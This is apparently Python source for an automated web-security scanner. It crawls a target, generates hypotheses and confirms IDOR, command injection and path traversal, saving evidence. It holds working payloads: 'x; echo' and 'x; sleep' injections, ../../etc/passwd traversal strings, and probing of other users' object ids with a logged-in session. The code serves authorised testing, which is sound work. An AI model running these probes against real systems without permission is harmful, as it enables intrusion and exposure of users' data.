"""Dynamic, deterministic HTTP executors (no LLM).

Three things live here:
  - confirm_idor / confirm_cmdi: the reusable test procedures (idor.md / cmdi.md in code),
    each capturing raw evidence and returning a classification.
  - HttpIdorExecutors / HttpCmdiExecutors: thin, fully-parameterized wrappers (used by the
    focused e2e tests).
  - DynamicExecutors: the autonomous set — recon crawls the target and GENERATES the
    hypotheses, then hunt dispatches each to the right procedure. You point it at a base URL
    (+ optional credentials); it discovers the endpoints itself.

Why deterministic: for well-understood checks, code is faster, cheaper and reproducible
than an LLM. The LLM is better placed as a later triage/decision layer, not the hands.
"""
from __future__ import annotations

import json
import re
import secrets
from pathlib import Path
from urllib.parse import urlencode

from tools.crawler import crawl_site
from tools.httpx import Session, save_evidence

from .agents import SimulationExecutors
from .recon import fingerprint, make_hypotheses


# --------------------------------------------------------------------------- procedures

def confirm_idor(session, me_path, user_path_tmpl, victim_ids, ev_dir,
                 actor_name="user", id_field="email", own_id=None):
    """Baseline the actor's own object, then try each victim id with the same session."""
    if own_id is None:
        own_id = (session.get(me_path).json() or {}).get("id")
    baseline = session.get(user_path_tmpl.format(id=own_id))
    files = save_evidence(ev_dir, "baseline-own", baseline)
    own_val = (baseline.json() or {}).get(id_field)

    last = None
    for vid in victim_ids:
        cross = session.get(user_path_tmpl.format(id=vid))
        last = cross
        cj = cross.json() or {}
        if (cross.status == 200 and cj.get(id_field) not in (None, own_val)
                and str(cj.get("id")) == str(vid)):
            files += save_evidence(ev_dir, "cross-victim", cross)
            return {"status": "confirmed", "severity": "high",
                    "endpoint": user_path_tmpl.format(id=vid),
                    "payload": f"GET {user_path_tmpl.format(id=vid)} with {actor_name}'s session",
                    "proof": f"Session of '{actor_name}' read object id={vid} belonging to "
                             f"another user ({id_field}={cj.get(id_field)}).",
                    "false_positive_reason": None, "files": files}

    if last is not None:
        files += save_evidence(ev_dir, "cross-victim", last)
        if last.status in (401, 403, 404):
            return {"status": "false-positive", "severity": None, "endpoint": user_path_tmpl,
                    "payload": None, "proof": None,
                    "false_positive_reason": f"cross-object request returned {last.status} "
                                             f"(access controlled)", "files": files}
    return {"status": "unconfirmed", "severity": None, "endpoint": user_path_tmpl,
            "payload": None, "proof": None, "false_positive_reason": None, "files": files}


def confirm_cmdi(session, endpoint, param, method, ev_dir, blind_delay=1.0):
    """Reflected injection (with a literal control), then time-based blind as a fallback."""
    method = method.upper()

    def send(value):
        if method == "POST":
            return session.post(endpoint, data={param: value})
        return session.get(endpoint + "?" + urlencode({param: value}))

    token = "HB" + secrets.token_hex(4)
    files = []
    control = send(token)                       # literal: does the app merely echo input?
    inject = send(f"x; echo {token}")           # reflected injection
    files += save_evidence(ev_dir, "control-literal", control)
    files += save_evidence(ev_dir, "inject-reflected", inject)
    control_reflects = token in control.body
    inject_reflects = token in inject.body

    if inject_reflects and not control_reflects:
        return {"status": "confirmed", "severity": "high", "endpoint": endpoint,
                "payload": f"{param}=x; echo {token}",
                "proof": f"Unique marker {token} returned as command output "
                         f"(absent from the literal control).",
                "false_positive_reason": None, "files": files}
    if inject_reflects and control_reflects:
        return {"status": "false-positive", "severity": None, "endpoint": endpoint,
                "payload": None, "proof": None,
                "false_positive_reason": "marker reflected even without a command separator "
                                         "(input echoed, not executed)", "files": files}

    base0 = send("x; sleep 0")
    d1 = send(f"x; sleep {blind_delay}")
    d2 = send(f"x; sleep {blind_delay}")
    files += save_evidence(ev_dir, "timing-control-sleep0", base0)
    files += save_evidence(ev_dir, "timing-inject-sleepN", d1)
    thr = blind_delay * 0.6
    if (d1.elapsed - base0.elapsed) >= thr and (d2.elapsed - base0.elapsed) >= thr:
        return {"status": "confirmed", "severity": "high", "endpoint": endpoint,
                "payload": f"{param}=x; sleep {blind_delay}",
                "proof": f"Injected sleep added ~{blind_delay}s vs a sleep-0 control "
                         f"(control={base0.elapsed:.2f}s, injected={d1.elapsed:.2f}s/"
                         f"{d2.elapsed:.2f}s), reproduced twice.",
                "false_positive_reason": None, "files": files}
    return {"status": "unconfirmed", "severity": None, "endpoint": endpoint,
            "payload": None, "proof": None, "false_positive_reason": None, "files": files}


PASSWD_RE = re.compile(r"root:.*:0:0:")


def confirm_path_traversal(session, endpoint, param, method, ev_dir, benign="welcome.txt"):
    """Send a benign control, then traversal payloads targeting /etc/passwd. Confirm only if
    the passwd signature appears for a payload and NOT for the benign control."""
    method = method.upper()

    def send(value):
        if method == "POST":
            return session.post(endpoint, data={param: value})
        return session.get(endpoint + "?" + urlencode({param: value}))

    payloads = ["../../../../../../etc/passwd",
                "....//....//....//....//....//....//etc/passwd"]
    control = send(benign)
    files = save_evidence(ev_dir, "control-benign", control)
    control_leak = bool(PASSWD_RE.search(control.body))

    statuses = []
    for p in payloads:
        r = send(p)
        statuses.append(r.status)
        if PASSWD_RE.search(r.body) and not control_leak:
            files += save_evidence(ev_dir, "traversal", r)
            return {"status": "confirmed", "severity": "high", "endpoint": endpoint,
                    "payload": f"{param}={p}",
                    "proof": "Response contained /etc/passwd (line matching root:...:0:0:), "
                             "absent from the benign control.",
                    "false_positive_reason": None, "files": files}
        last = r
    files += save_evidence(ev_dir, "traversal", last)
    if all(s in (400, 401, 403, 404) for s in statuses):
        return {"status": "false-positive", "severity": None, "endpoint": endpoint,
                "payload": None, "proof": None,
                "false_positive_reason": f"traversal rejected/sanitized (statuses {statuses})",
                "files": files}
    return {"status": "unconfirmed", "severity": None, "endpoint": endpoint,
            "payload": None, "proof": None, "false_positive_reason": None, "files": files}


def _finding(fid, hyp, res, requests_used):
    return {"id": fid, "hypothesis_id": hyp["id"], "class": hyp["class"],
            "status": res["status"], "endpoint": res["endpoint"],
            "method": hyp.get("method", "GET"), "parameter": hyp.get("parameter"),
            "severity": res["severity"], "payload": res["payload"], "proof": res["proof"],
            "evidence": {"dir": f"findings/evidence/{fid}/", "files": res["files"]},
            "false_positive_reason": res["false_positive_reason"],
            "requests_used": requests_used}


# --------------------------------------------------------------------- parameterized sets

class HttpIdorExecutors:
    def __init__(self, base_url, login_path, me_path, user_path, user, victim_id,
                 id_field="email"):
        self.base, self.login_path, self.me_path = base_url, login_path, me_path
        self.user_path, self.user, self.victim_id = user_path, user, victim_id
        self.id_field = id_field

    def _login(self):
        s = Session(self.base)
        s.post(self.login_path, data={"username": self.user["username"],
                                      "password": self.user["password"]})
        return s

    def recon(self, store, urls, objective):
        s = self._login()
        s.get(self.me_path)
        hyp = {"id": "H-001", "endpoint": self.user_path, "method": "GET", "parameter": "id",
               "class": "IDOR", "confidence": "high",
               "reason": "Object endpoint takes a client-controlled id.", "status": "open"}
        _save(store.dir / "recon" / "hypotheses.json", [hyp])
        return {"requests_used": s.request_count}

    def hunt(self, store, hyp, urls):
        fid = "F-" + str(hyp["id"]).split("-", 1)[-1]
        ev_dir = store.dir / "findings" / "evidence" / fid
        s = self._login()
        res = confirm_idor(s, self.me_path, self.user_path, [self.victim_id], ev_dir,
                           actor_name=self.user["username"], id_field=self.id_field)
        _save(store.dir / "findings" / f"{fid}.json", _finding(fid, hyp, res, s.request_count))
        return {"finding_file": str(store.dir / "findings" / f"{fid}.json"),
                "status": res["status"], "requests_used": s.request_count}

    def report(self, store):
        return SimulationExecutors({}).report(store)


class HttpCmdiExecutors:
    def __init__(self, base_url, endpoint, param, method="GET", blind_delay=1.0):
        self.base, self.endpoint, self.param = base_url, endpoint, param
        self.method, self.blind_delay = method.upper(), blind_delay

    def recon(self, store, urls, objective):
        hyp = {"id": "H-001", "endpoint": self.endpoint, "method": self.method,
               "parameter": self.param, "class": "CMDI", "confidence": "medium",
               "reason": f"Parameter '{self.param}' may reach an OS command.", "status": "open"}
        _save(store.dir / "recon" / "hypotheses.json", [hyp])
        return {"requests_used": 0}

    def hunt(self, store, hyp, urls):
        fid = "F-" + str(hyp["id"]).split("-", 1)[-1]
        ev_dir = store.dir / "findings" / "evidence" / fid
        s = Session(self.base)
        res = confirm_cmdi(s, self.endpoint, self.param, self.method, ev_dir, self.blind_delay)
        _save(store.dir / "findings" / f"{fid}.json", _finding(fid, hyp, res, s.request_count))
        return {"finding_file": str(store.dir / "findings" / f"{fid}.json"),
                "status": res["status"], "requests_used": s.request_count}

    def report(self, store):
        return SimulationExecutors({}).report(store)


class HttpPathTraversalExecutors:
    def __init__(self, base_url, endpoint, param, method="GET", benign="welcome.txt"):
        self.base, self.endpoint, self.param = base_url, endpoint, param
        self.method, self.benign = method.upper(), benign

    def recon(self, store, urls, objective):
        hyp = {"id": "H-001", "endpoint": self.endpoint, "method": self.method,
               "parameter": self.param, "class": "PATH-TRAVERSAL", "confidence": "medium",
               "reason": f"Parameter '{self.param}' may reference a file path.", "status": "open"}
        _save(store.dir / "recon" / "hypotheses.json", [hyp])
        return {"requests_used": 0}

    def hunt(self, store, hyp, urls):
        fid = "F-" + str(hyp["id"]).split("-", 1)[-1]
        ev_dir = store.dir / "findings" / "evidence" / fid
        s = Session(self.base)
        res = confirm_path_traversal(s, self.endpoint, self.param, self.method, ev_dir,
                                     benign=self.benign)
        _save(store.dir / "findings" / f"{fid}.json", _finding(fid, hyp, res, s.request_count))
        return {"finding_file": str(store.dir / "findings" / f"{fid}.json"),
                "status": res["status"], "requests_used": s.request_count}

    def report(self, store):
        return SimulationExecutors({}).report(store)


# --------------------------------------------------------------------------- autonomous

class DynamicExecutors:
    """Autonomous set: recon crawls and generates hypotheses; hunt dispatches by class.

    base_url:   in-scope base (falls back to the first scope URL).
    accounts:   [{"username","password"}, ...] for authenticated recon/hunts (optional).
    login_path/me_path: auth endpoints (defaults match typical apps / the fixture).
    """

    def __init__(self, base_url=None, accounts=None, login_path="/login", me_path="/me",
                 max_crawl=60):
        self.base = base_url
        self.accounts = accounts or []
        self.login_path, self.me_path, self.max_crawl = login_path, me_path, max_crawl

    def _session(self):
        s = Session(self.base)
        if self.accounts:
            s.post(self.login_path, data={"username": self.accounts[0]["username"],
                                          "password": self.accounts[0]["password"]})
        return s

    def recon(self, store, urls, objective):
        self.base = self.base or urls[0]
        s = self._session()
        root = s.get("/")
        crawl = crawl_site([self.base], s, max_requests=self.max_crawl)
        _save(store.dir / "recon" / "tech.json", fingerprint(root.headers))
        _save(store.dir / "recon" / "surface.json", crawl.to_surface())
        _save(store.dir / "recon" / "js.json",
              {"files": sorted(crawl.js_files), "endpoints": sorted(crawl.js_endpoints)})
        _save(store.dir / "recon" / "hypotheses.json", make_hypotheses(crawl))
        return {"requests_used": s.request_count}

    def hunt(self, store, hyp, urls):
        self.base = self.base or urls[0]
        fid = "F-" + str(hyp["id"]).split("-", 1)[-1]
        ev_dir = store.dir / "findings" / "evidence" / fid
        s = self._session()
        actor = self.accounts[0]["username"] if self.accounts else "user"

        if hyp["class"] == "IDOR":
            own = (s.get(self.me_path).json() or {}).get("id")
            discovered = list(hyp.get("object_ids", []))
            cands = [c for c in dict.fromkeys(discovered + _around(own))
                     if isinstance(c, int) and c > 0 and c != own]
            res = confirm_idor(s, self.me_path, hyp["endpoint"], cands, ev_dir,
                               actor_name=actor, own_id=own)
        elif hyp["class"] == "CMDI":
            res = confirm_cmdi(s, hyp["endpoint"], hyp["parameter"],
                               hyp.get("method", "GET"), ev_dir)
        elif hyp["class"] in ("PATH-TRAVERSAL", "PATH_TRAVERSAL"):
            res = confirm_path_traversal(s, hyp["endpoint"], hyp["parameter"],
                                         hyp.get("method", "GET"), ev_dir)
        else:
            res = {"status": "unconfirmed", "severity": None, "endpoint": hyp["endpoint"],
                   "payload": None, "proof": None, "false_positive_reason": None, "files": []}

        _save(store.dir / "findings" / f"{fid}.json", _finding(fid, hyp, res, s.request_count))
        return {"finding_file": str(store.dir / "findings" / f"{fid}.json"),
                "status": res["status"], "requests_used": s.request_count}

    def report(self, store):
        return SimulationExecutors({}).report(store)


def _around(own):
    if not isinstance(own, int):
        return []
    return [own + 1, own - 1, own + 2, own + 3]


def _save(p: Path, data):
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text(json.dumps(data, indent=2) + "\n")
